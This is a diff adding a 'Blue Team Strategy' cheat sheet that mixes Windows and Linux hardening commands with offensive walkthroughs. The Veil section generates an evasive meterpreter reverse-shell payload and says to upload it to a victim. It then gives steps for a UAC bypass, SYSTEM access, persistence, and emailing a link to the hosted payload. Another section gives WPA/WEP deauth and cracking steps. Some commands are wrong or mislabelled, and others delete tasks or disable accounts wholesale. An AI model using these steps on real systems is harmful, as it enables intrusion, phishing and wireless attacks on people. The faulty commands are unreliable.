@@ -1,0 +1,271 @@
+
+BLUE TEAM STRATEGY Rev 1.0
+====================
+
+*** MAKE SURE IN WINDOWS SERVER 2012, and 7+ you run command prompt as Administrator!
+
+Steps to lock down your Windows System:
+=========================================
+
+1. Disable all non-Windows services in Msconfig
+	
+	- Click "start" select "run", and type "msconfig" then press enter
+	- Click the "Services" tab
+	- Click Hide all Windows Services
+	- Disable all non-Windows services still showing by clicking the "disable all" button
+	- Click "Apply" in the lower right hand corner
+	- Close Msconfig by clicking "Ok"
+	- Msconfig will prompt for a restart, before clicking "yes" on the restart dialog do the following:
+		- Open Command Prompt:
+			--TYPE:
+			- netsh firewall set opmode enable disable <--- Win XP
+			- netsh advfirewall set allprofiles state on <--- Win 7+
+			- schtasks /tn * /delete  <--- Deletes all scheduled tasks
+			- shutdown /r /t 0  <----- Restarts the PC
+
+2. Once the PC restarts:
+
+	- Open Command Prompt:
+
+	-- TYPE:
+	- net user <accountname> <password> /add    <----- Adds a new user account to the machine with a password
+	- net localgroup administrators <accountname> /add   <----- Adds your new user to the administrators group
+	- wmic useraccount where name!='<accountname>' set disabled=true  <----- Disables all user accounts that are not the one you added
+	- sc stop LanmanServer /yes	<----- Stops the Server service
+	- sc config LanmanServer start= disabled  <---- Disables the Server Service
+	- sc stop LmHosts /yes 		<----- Stops TCP/IP over Netbios service
+	- sc config LmHosts start= disabled  <---- Disables the TCP/IP over Netbios Service
+
+******* DO NOT DISABLE LANMANSERVER AND LMHOSTS IF PC IS ON ACTIVE DIRECTORY!
+
+** If you want to ensure there is nothing malicious in the computer's temporary files you can clear them with: 
+
+	  del /q/f/s %TEMP%\*  <--- This will delete all files in the Temporary folder for the account
+	  del /q/f/s %Windir%\Temp <--- This will delete all temp files in the Windows directories
+
+
+
+
+*** All of the above Windows commands you can put into a blank notepad file and then save it as a .bat file to run automatically. Remember to always save a batch file as "<filename>.bat" and choose "all files" under the drop down list.
+	
+
+
+See who is connected to you in Windows
+---------------------------------------
+
+> nbstat -b -o  (Need to be in Admin CMD!)
+
+> type "taskkill /pid <pid> /f" to stop that connection
+
+Alternatively use taskmanager and kick off user accounts connecting under users, and stop services related to meterpreter.
+If an attacker has persistence on your machine you need to remove their persistent service/process or else this will be a losing game.
+
+
+Helpful Powershell Commands
+============================
+
+-- Provide last 30 days of Security Events on Windows machines 7+ to a file
+
+	- Get-EventLog Security -After (get-date).addDay(-30) > YourFile.txt
+	
+-- Stops the ability to execute scripts in Powershell
+	
+	- Set-ExecutionPolicy Restricted
+
+
+
+Helpful Nmap Scan
+===================
+
+nmap -sS -O <ip>
+
+for range:
+
+nmap -sS -O 10.0.1.1-15
+
+
+
+USE VEIL
+===============
+OPEN Terminal
+TYPE Veil  ## If you have veil-evasion installed as one utility then type "veil-evasion" instead of just veil. Then continue to follow the instructions below.
+Select Evasion with the command "use 2"
+TYPE List
+Select ruby/meterpreter/rev_tcp.rb BY TYPING "use 39"
+TYPE set lhost <Your IP>
+TYPE generate
+GRAB PAYLOAD FROM cd /var/lib/veil/output/compiled
+OR TYPE cd /var/lib/veil/output/compiled
+TYPE mv payload.exe /root/Desktop
+TYPE cd ~
+TYPE  cd /var/lib/veil/output/handlers
+TYPE msfconsole -r handler.rc
+LEAVE HANDLER OPEN AND UPLOAD EXE TO VICTIM
+TYPE sessions -i 1
+TYPE background IN METERPRETER
+TYPE use exploit/windows/local/bypassuac
+TYPE set payload windows/meterpreter/reverse_tcp
+TYPE set lhost <IP>
+TYPE set lport <port>
+TYPE set session 1
+TYPE exploit
+TYPE getsystem
+TYPE getuid
+TYPE run persistence
+
+- Put your Payload in /var/www/html
+THEN START APACHE2! 
+- sudo service apache2 start
+
+Then embed your payload in your email using ctrl+l to create a link, make sure your link is your machine's IP address followed by the payload
+
+Example: 192.168.3.15/payload.exe
+
+
+WPA & WEP CRACKING
+===================
+TYPE airmon-ng stop wlan0
+TYPE the command that appears in the error message after typing "airmon-ng stop wlan0"
+TYPE airmon-ng start wlan0
+Enter Y if it asks you a Yes or No question about the interface
+TYPE airodump-ng wlan0mon  ## Only add "mon" to the end if you run ifconfig and you see "mon" attached to the network card
+RECORD channel and BSSID
+TYPE airodump-ng -c <channel> --bssid <BSSID MAC> -w <filename> wlan0mon
+RECORD station MAC
+KEEP THIS WINDOW OPEN
+TYPE aireplay-ng --arpreplay -b <BSSID MAC> -h <STATION MAC> wlan0mon  <---- FOR ARP REPLAY ATTACK
+TYPE aireplay-ng --deauth 0 -c <STATION MAC> -a <ROUTER MAC> wlan0mon   <---- FOR DEAUTH ATTACK (Easier if no new devices are connecting to the target network)
+WAIT FOR HANDSHAKE IN PREVIOUS WINDOW
+TYPE aircrack-ng -b <BSSID MAC> -w <wordlist.txt> <file-01.cap>  <----- TO BEGIN CRACK
+
+
+SETTING LINUX FIREWALL
+======================
+iptables -F INPUT
+iptables -P INPUT ACCEPT
+iptables -P FORWARD ACCEPT
+iptables -P OUTPUT ACCEPT
+iptables -P INPUT DROP
+iptables -A INPUT -i lo -j ACCEPT
+iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+iptables -A INPUT -m state --state NEW -p tcp --dport 22 -j ACCEPT
+iptables -A INPUT -m state --state NEW -p tcp --dport 80 -j ACCEPT
+iptables -A INPUT -m state --state NEW -p tcp --dport 443 -j ACCEPT
+iptables-save  > /usr/local/etc/myconfig.fw
+vi /etc/network/interfaces
+
+
+ONCE YOU OPEN THE "INTERFACES" DOCUMENT ENTER IN:
+
+auto eth0
+iface eth0 inet dhcp
+pre-up iptables-restore < /usr/local/etc/myconfig.fw
+
+THEN SAVE AND QUIT BY PRESSING ESCAPE, THEN SHIFT + : AND THEN "wq"
+
+** Your firewall should now be set to only allow for traffic on ports 22, 80, and 443. This will stop your meterpreter from working if you do this on Kali!!!
+** To add exceptions for meterpreter in Kali, enter "iptables -A INPUT -m state --state NEW -p tcp --dport 4444 -j ACCEPT" and "iptables -A OUTPUT -m state --state NEW -p tcp --dport 4444 -j ACCEPT" after you put in the entry for port 443.
+
+IF you created a ruby script store it in usr/share/metasploit-framework/scripts
+call on it using "run <scriptname>.rb" when in a meterpreter session.
+
+
+
+Setting up Linux
+====================
+
+Change IP address and subnet mask:
+-----------------------------------
+
+> ifconfig eth0 <ip> netmask 255.255.255.0
+
+Disable Promiscuous mode:
+--------------------------
+
+> ifconfig eth0 -promisc
+
+Turn interface on and off:
+--------------------------
+
+> ifconfig eth0 up
+
+> ifconfig eth0 down
+
+
+Add/Remove User accounts
+--------------------------
+
+> adduser <username>
+
+> deluser <username>
+
+
+Add user to Sudo Group
+------------------------
+
+usermod -aG sudo <username>
+
+** Be careful with who you give Super User to!
+
+
+To disable user access
+---------------------------
+
+> vi /etc/passwd
+
+> Change /bin/bash at the end of user to /bin/nologin
+
+> shift + : then type wq to exit vim
+
+or
+
+> passwd -l <username> <---- Locks
+
+> passwd -u <username> <---- Unlocks
+
+
+See who is connected to you in Linux
+---------------------------------------
+
+> netstat -natp
+
+> type "kill -9 <pid>" to stop that connection
+
+
+See processes allowing port connections
+----------------------------------------
+netstat -lp
+
+
+View processes running in Linux
+===============================
+
+> ps -aux | less
+or
+> ps -a
+
+View services running on Linux
+===============================
+
+> ps ax
+or
+> service --status-all
+
+
+Stop Services running in Linux
+===================================
+> chkconfig apache2 off <---- Turns off Mysql Server
+or
+> sudo service apache2 stop
+or
+> systemctl stop apache2
+or
+> sudo stop apache2 (deprecated method; may not work!)
+
+Disable at startup
+=====================
+
+> update-rc.d -f apache2 remove
+or
+> systemctl disable apache2
+
